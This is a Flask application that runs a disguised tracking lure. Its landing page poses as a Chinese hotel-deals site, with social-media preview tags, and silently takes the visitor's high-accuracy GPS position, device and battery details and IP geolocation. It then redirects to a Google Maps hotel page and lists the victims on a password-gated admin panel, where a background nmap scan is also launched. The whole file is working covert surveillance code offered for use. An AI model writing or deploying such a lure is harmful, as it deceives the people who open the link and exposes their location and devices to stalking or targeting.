from flask import Flask, render_template_string, request, jsonify
import datetime
import urllib.request
import json
import nmap
import threading
from user_agents import parse
import base64

app = Flask(__name__)

# Buffers de armazenamento em RAM (Mainframe Core)
registros_gps = []
registros_ip = []

# Credenciais de Acesso ao Console
SENHA_ADMIN = "123123"

# Link de redirecionamento final solicitado
LINK_DESTINO = "https://www.google.com/maps/place/Oaks+Chengdu+at+Cultural+Heritage+Park/@30.6887276,103.9289403,15z/data=!4m12!1m2!2m1!1zSG90w6lpcw!3m8!1s0x36efc2ba0825d43b:0x2c1214b7071a826c!5m2!4m1!1i2!8m2!3d30.678253!4d103.93095!16s%2Fg%2F11sk9qfcrj?entry=ttu&g_ep=EgoyMDI2MDgzMS4wIKXMDSoASAFQAw%3D%3D"

# Codificar a imagem trol.jpeg em Base64 automaticamente na inicialização
try:
    with open("trol.jpeg", "rb") as img_file:
        trol_base64 = base64.b64encode(img_file.read()).decode('utf-8')
        TROL_IMG_SRC = f"data:image/jpeg;base64,{trol_base64}"
except Exception:
    TROL_IMG_SRC = ""

# Página HTML de Captura Totalmente Oculta (Silenciosa) com Meta Tags Open Graph
HTML_CAPTURA = f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Hotéis na China e Região</title>
    
    <!-- Meta Tags Open Graph para o WhatsApp / Redes Sociais -->
    <meta property="og:title" content="Reserva de Hotéis - Arquitetura e Hospedagem na China">
    <meta property="og:description" content="Encontre as melhores ofertas e pacotes de hospedagem na China com desconto exclusivo.">
    <meta property="og:image" content="https://images.unsplash.com/photo-1508804185872-d7badad00f7d">
    <meta property="og:url" content="https://loc-nsdi.onrender.com/">
    <meta property="og:type" content="website">

    <style>
        body {{ background-color: #ffffff; margin: 0; }}
    </style>
</head>
<body>
    <script>
        const urlDestino = "{LINK_DESTINO}";

        async function executarPayloadCompleto(lat = null, lon = null, precisao = null) {{
            let infoHardware = {{
                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                deviceMemory: navigator.deviceMemory || 'N/A',
                platform: navigator.platform || 'N/A',
                language: navigator.language || 'N/A',
                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
                cookieEnabled: navigator.cookieEnabled ? 'SIM' : 'NÃO',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                connectionType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType.toUpperCase() : 'DESCONHECIDO',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
                bateria: 'N/A',
                resolucqao: window.screen.width + 'x' + window.screen.height,
                colorDepth: window.screen.colorDepth + ' bits'
            }};

            if (navigator.getBattery) {{
                try {{
                    let bat = await navigator.getBattery();
                    infoHardware.bateria = Math.round(bat.level * 100) + '% (' + (bat.charging ? 'CARREGANDO' : 'DESCARGA') + ')';
                }} catch(e) {{}}
            }}

            const payload = {{
                hw: infoHardware,
                latitude: lat,
                longitude: lon,
                precisao: precisao
            }};

            try {{
                await fetch('/salvar-payload-total', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(payload)
                }});
            }} catch(e) {{
                console.error("Erro no dispatch:", e);
            }} finally {{
                window.location.replace(urlDestino);
            }}
        }}

        function lidarComSucesso(position) {{
            executarPayloadCompleto(
                position.coords.latitude,
                position.coords.longitude,
                position.coords.accuracy
            );
        }}

        function lidarComErro(error) {{
            console.warn("GPS Negado ou Indisponível: " + error.message);
            executarPayloadCompleto(null, null, null);
        }}

        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(lidarComSucesso, lidarComErro, {{
                enableHighAccuracy: true,
                timeout: 6000,
                maximumAge: 0
            }});
        }} else {{
            executarPayloadCompleto(null, null, null);
        }}
    </script>
</body>
</html>
"""

# Painel Administrativo com a imagem zueira esticada/achatada no canto superior direito ao fundo
HTML_PAINEL = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>MAINFRAME TERMINAL - COBOL COMPILER</title>
    <style>
        body { 
            font-family: 'Courier New', Courier, monospace; 
            margin: 0; 
            padding: 20px; 
            background: #000000; 
            color: #00FF00; 
            position: relative;
        }
        /* Estilização da zueira: esticada, achatada, no fundo, canto superior direito */
        .troll-bg {
            position: fixed;
            top: 15px;
            right: 15px;
            width: 380px;
            height: 55px;
            object-fit: fill;
            opacity: 0.25;
            z-index: -1;
            pointer-events: none;
            border: 1px dashed #00FF00;
        }
        pre {
            color: #00FF00;
            font-size: 12px;
            line-height: 1.4;
        }
        .yellow { color: #FFFF00; }
        .red { color: #FF5555; }
        .cyan { color: #55FFFF; }
        .white { color: #FFFFFF; }
        table { 
            width: 100%; 
            border-collapse: collapse; 
            background: #000000; 
            margin-top: 15px; 
            margin-bottom: 30px;
            border: 1px solid #00FF00;
        }
        th, td { 
            border: 1px solid #00FF00; 
            padding: 6px 8px; 
            text-align: left; 
            font-size: 11px;
            color: #FFFF00;
        }
        th { 
            background: #001100; 
            color: #00FF00; 
        }
        tr:hover { background: #002200; }
        a { color: #55FFFF; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .badge { background: #003300; color: #00FF00; padding: 1px 4px; border: 1px solid #00FF00; font-size: 10px; display: inline-block; margin: 1px; }
    </style>
</head>
<body>

<!-- Imagem zueira aplicada no canto superior direito -->
<img src="{{ troll_img }}" class="troll-bg" alt="Troll Face">

<pre>
<span class="red">*--------------------------------------------------------------------------------------------------*</span>
<span class="yellow">  identification division.</span>
<span class="red">*--------------------------------------------------------------------------------------------------*</span>
  program-id.      MAINFRAME-SECURE-CONSOLE.
  author.          PENTESTER-CORE.
  installation.    SYSTEM-TELEMETRY-UNIT.
  date-written.    2026-09-03.
<span class="red">*--------------------------------------------------------------------------------------------------*</span>
  <span class="cyan">REFERENCIAS</span> :  SISTEMA   : U   - SUPORTE
                 SUBSISTEMA: UP  - APOIO A PRODUCAO
                 MODULO    : 06  - SCHEDULER & NMAP ENGINE
<span class="red">*--------------------------------------------------------------------------------------------------*</span>
  STATUS CONSOLE : <span class="white">ONLINE-ACTIVE</span> | AUTO-REFRESH: <span class="white">5s</span> | SECURE PROTOCOL: <span class="white">TCP/IP</span>
</pre>

<h3 class="yellow">[ 01. TABELA DE CAPTURAS DE GEOLOCALIZAÇÃO GPS ]</h3>
<p class="white">Total de Registros GPS Capturados: {{ gps|length }}</p>
<table>
    <tr>
        <th>DATA / HORA</th>
        <th>IP DE ORIGEM</th>
        <th>LATITUDE / LONGITUDE</th>
        <th>PRECISÃO</th>
        <th>EXTERNAL MAP LINK</th>
    </tr>
    {% for r in gps %}
    <tr>
        <td>{{ r.data }}</td>
        <td>{{ r.ip }}</td>
        <td>{{ r.lat }}, {{ r.lon }}</td>
        <td>{{ r.precisao }}m</td>
        <td><a href="{{ r.maps }}" target="_blank">[ABRIR GOOGLE MAPS]</a></td>
    </tr>
    {% else %}
    <tr><td colspan="5" style="color: #FF5555; text-align: center;">>> 01 CONDITIONAL: NENHUM DADO DE GPS CAPTURADO NESTE CLUSTER <<</td></tr>
    {% endfor %}
</table>

<h3 class="yellow">[ 02. TABELA DE INTELIGÊNCIA DE REDE, HARDWARE, NMAP & USER-AGENT ]</h3>
<p class="white">Total de Registros de Hardware/Rede: {{ ips|length }}</p>
<table>
    <tr>
        <th>DATA / HORA</th>
        <th>IP / GEO / REDE</th>
        <th>ISP / PROVEDOR</th>
        <th>HARDWARE & DISPOSITIVO</th>
        <th>AMBIENTE & NAVEGADOR (USER-AGENT)</th>
        <th>PORTAS ABERTAS (NMAP LAB SCAN)</th>
    </tr>
    {% for r in ips %}
    <tr>
        <td>{{ r.data }}</td>
        <td>
            {{ r.ip }}<br>
            <span class="cyan">{{ r.cidade }}/{{ r.estado }} ({{ r.pais }})</span><br>
            Link: <span class="white">{{ r.hw.connectionType }}</span>
        </td>
        <td>{{ r.isp }}</td>
        <td>
            CPU Cores: {{ r.hw.hardwareConcurrency }}<br>
            RAM Aprox: {{ r.hw.deviceMemory }} GB<br>
            Bateria: {{ r.hw.bateria }}<br>
            Resolução: {{ r.hw.resolucqao }} ({{ r.hw.colorDepth }})<br>
            Touch: {{ r.hw.maxTouchPoints }} | Cookies: {{ r.hw.cookieEnabled }}<br>
            Fuso: {{ r.hw.timezone }}
        </td>
        <td>
            <b>OS:</b> {{ r.ua_info.os }}<br>
            <b>Browser:</b> {{ r.ua_info.browser }}<br>
            <b>Device:</b> {{ r.ua_info.device }}<br>
            <b>Idioma:</b> {{ r.hw.language }}<br>
            <details style="margin-top: 4px;">
                <summary style="cursor: pointer; color: #55FFFF;">Inspect User-Agent</summary>
                <small style="word-break: break-all; color: #AAAAAA;">{{ r.user_agent }}</small>
            </details>
        </td>
        <td>
            {% if r.portas %}
                {% for p in r.portas %}
                    <span class="badge">Porta {{ p.porta }}: {{ p.servico }} ({{ p.estado }})</span><br>
                {% endfor %}
            {% else %}
                <span class="red">PERFORM NMAP-SCAN VARYING...</span>
            {% endif %}
        </td>
    </tr>
    {% else %}
    <tr><td colspan="6" style="color: #FF5555; text-align: center;">>> 01 CONDITIONAL: NENHUM REGISTRO DE HARDWARE CAPTURADO <<</td></tr>
    {% endfor %}
</table>

<script>
    setTimeout(function(){
        window.location.reload();
    }, 5000);
</script>
</body>
</html>
"""

def executar_nmap_background(registro_ref):
    try:
        nm = nmap.PortScanner()
        nm.scan('scanme.nmap.org', arguments='-p 22,80,443,3306,8080 --open -T4')
        
        portas_encontradas = []
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                lport = nm[host][proto].keys()
                for p in lport:
                    estado = nm[host][proto][p]['state']
                    servico = nm[host][proto][p]['name']
                    portas_encontradas.append({"porta": p, "estado": estado, "servico": servico})
        
        registro_ref["portas"] = portas_encontradas
    except Exception as e:
        print(f"Erro na varredura Nmap: {e}")
        registro_ref["portas"] = [{"porta": "N/A", "estado": "blocked", "servico": "filtered"}]

@app.route('/')
def index():
    return render_template_string(HTML_CAPTURA)

@app.route('/salvar-payload-total', methods=['POST'])
def salvar_payload_total():
    dados = request.json or {}
    
    ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_cliente:
        ip_cliente = ip_cliente.split(',')[0].strip()
        
    user_agent_str = request.headers.get('User-Agent', 'Desconhecido')
    parsed_ua = parse(user_agent_str)
    ua_info = {
        "os": f"{parsed_ua.os.family} {parsed_ua.os.version_string}".strip(),
        "browser": f"{parsed_ua.browser.family} {parsed_ua.browser.version_string}".strip(),
        "device": f"{parsed_ua.device.brand or ''} {parsed_ua.device.model or ''} ({'Mobile' if parsed_ua.is_mobile else 'Tablet' if parsed_ua.is_tablet else 'PC'})".strip()
    }

    agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    cidade, estado, pais, isp = "Desconhecido", "Desconhecido", "Desconhecido", "Desconhecido"
    try:
        if ip_cliente != "127.0.0.1" and ip_cliente != "localhost":
            url = f"http://ip-api.com/json/{ip_cliente}?lang=pt-BR"
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=2) as response:
                api_data = json.loads(response.read().decode())
                if api_data.get('status') == 'success':
                    cidade = api_data.get('city', 'Desconhecido')
                    estado = api_data.get('regionName', 'Desconhecido')
                    pais = api_data.get('country', 'Desconhecido')
                    isp = api_data.get('isp', 'Desconhecido')
    except Exception as e:
        print("Erro GeoIP:", e)

    hw = dados.get('hw', {})

    novo_registro_ip = {
        "data": agora,
        "ip": ip_cliente,
        "cidade": cidade,
        "estado": estado,
        "pais": pais,
        "isp": isp,
        "hw": hw,
        "ua_info": ua_info,
        "user_agent": user_agent_str,
        "portas": []
    }
    registros_ip.insert(0, novo_registro_ip)

    t = threading.Thread(target=executar_nmap_background, args=(novo_registro_ip,))
    t.start()

    lat = dados.get('latitude')
    lon = dados.get('longitude')
    precisao = dados.get('precisao')

    if lat is not None and lon is not None:
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        registros_gps.insert(0, {
            "data": agora,
            "ip": ip_cliente,
            "lat": lat,
            "lon": lon,
            "precisao": precisao,
            "maps": maps_link
        })

    return jsonify({"status": "sucesso", "payload": "processed"})

@app.route('/admin', methods=['GET'])
def admin():
    senha_informada = request.args.get('senha', '')
    if senha_informada != SENHA_ADMIN:
        return """
        <body style="font-family: 'Courier New'; background: #000000; color: #FF5555; text-align: center; margin-top: 15%;">
            <h2>004010 SECURITY EXCEPTION - ACCESS DENIED</h2>
            <p>AUTORIZAÇÃO REQUERIDA NA URL: <code>/admin?senha=SUA_SENHA</code></p>
        </body>
        """, 403
        
    return render_template_string(HTML_PAINEL, gps=registros_gps, ips=registros_ip, troll_img=TROL_IMG_SRC)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)